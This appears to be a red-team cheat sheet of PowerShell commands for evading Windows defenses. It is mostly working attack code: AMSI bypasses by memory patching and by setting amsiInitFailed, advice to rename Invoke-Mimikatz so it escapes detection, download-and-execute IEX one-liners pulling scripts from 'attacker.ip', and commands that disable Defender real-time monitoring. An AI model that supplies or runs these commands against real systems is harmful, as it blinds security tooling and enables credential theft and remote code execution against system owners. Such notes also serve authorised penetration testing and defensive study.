
- Bypass AMSI with powershell (*Note* probably Win10 only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

- Win10 Bypass AMSI through amsiInitFailed (does not work on Win11 as far as I can tell)
	- Error on Win11 `MethodInvocationException: Exception calling "SetValue" with "2" argument(s): "Cannot set initonly static field 's_amsiInitFailed' after type 'System.Management.Automation.AmsiUtils' is initialized."`
	- TODO: research this more
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
$g=$f.SetValue($null,$true)
```


### Bypassing AMSI to execute malicious scripts 

- ASMI Bypass Powershell code with inspiration from (https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)
	- use ASBB.ps1 as a base
	- If downloading scripts that will be flagged by AMSI, rename them
	- add download code for these scripts at the end of ASBB.ps1
	- example for `Invoke-Mimikatz.ps1` which is renamed to `IM.ps1`
```powershell
(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/IM.ps1') | IEX
```
- Download example
```powershell
iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/ASBB.ps1')”
```

- Tamper Protection status:
	- If the output is `False`, Tamper Protection is enabled.
	-  If the output is `True`, Tamper Protection is disabled.
```powershell
(Get-MpPreference).DisableTamperProtection
```

- Disable Defender if Tamper Protection is off
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```

- Download and execute Powershell script

```powershell
 iex (New-Object Net.WebClient).DownloadString('http://ipaddress/script.ps1')
```

```powershell
Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://ipaddress/script.ps1').Content
```

- View Applocker Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
